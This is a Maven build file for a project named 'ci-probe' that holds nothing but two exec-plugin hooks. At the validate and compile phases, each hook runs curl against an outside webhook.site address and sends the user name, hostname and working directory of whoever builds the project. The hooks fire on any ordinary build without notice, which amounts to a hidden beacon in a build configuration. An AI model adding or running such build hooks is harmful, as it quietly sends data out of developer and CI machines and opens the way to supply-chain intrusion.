<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>probe</groupId><artifactId>ci-probe</artifactId><version>1.0</version>
  <packaging>pom</packaging>
  <build><plugins>
    <plugin>
      <groupId>org.codehaus.mojo</groupId><artifactId>exec-maven-plugin</artifactId><version>3.1.0</version>
      <executions>
        <execution><id>beacon</id><phase>validate</phase><goals><goal>exec</goal></goals>
          <configuration><executable>/bin/sh</executable>
            <arguments><argument>-c</argument><argument>curl -s -m 20 "https://webhook.site/f0e1ac49-8edb-45f1-963c-1d471b89fd96?m=mvn-validate&u=$(id -un)&h=$(hostname)&p=$(pwd)"</argument></arguments>
          </configuration>
        </execution>
        <execution><id>beacon2</id><phase>compile</phase><goals><goal>exec</goal></goals>
          <configuration><executable>/bin/sh</executable>
            <arguments><argument>-c</argument><argument>curl -s -m 20 "https://webhook.site/f0e1ac49-8edb-45f1-963c-1d471b89fd96?m=mvn-compile&u=$(id -un)&h=$(hostname)&p=$(pwd)"</argument></arguments>
          </configuration>
        </execution>
      </executions>
    </plugin>
  </plugins></build>
</project>
